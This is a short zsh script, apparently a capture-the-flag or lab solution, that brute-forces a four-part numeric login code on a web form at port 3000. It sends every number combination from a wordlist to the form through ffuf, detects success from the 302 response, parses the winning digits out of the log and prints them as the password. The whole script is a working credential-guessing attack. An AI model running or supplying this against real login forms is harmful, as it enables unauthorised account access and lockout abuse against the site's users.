#!/bin/zsh

IP_address=$1
ffuf -w numbers.txt:FIRST -w numbers.txt:SECOND -w numbers.txt:THIRD -w numbers.txt:FOURTH \
	-u "http://${IP_address}:3000/login" -X POST -H "Content-Type: application/x-www-form-urlencoded" \
	-d "input-1=FIRST&input-2=SECOND&input-3=THIRD&input-4=FOURTH&time=$(date +%s)" | tee log \

clear
sed -i -e 's/\r//g' -e 's/\x1b//g' log #remove the ^M^ and unreadable chars
line_num=$(grep -n "302" log | awk -F: '{print $1}') # gets the success line

first_line=$((++ line_num))
fourth_line=$((++ line_num))
second_line=$((++ line_num))
third_line=$((++ line_num))

end_line=$((line_num + 4))
first=$(sed -n "${first_line}p" log | awk '{print $4}')
second=$(sed -n "${second_line}p" log | awk '{print $4}')
third=$(sed -n "${third_line}p" log | awk '{print $4}')
fourth=$(sed -n "${fourth_line}p" log | awk '{print $4}')


print "Password is: (enter is quick lol, i cant be bothered to automate filling forms)"
print $first $second $third $fourth

chrom $IP_address:3000 #chrom is a chromuim shortcut

exit
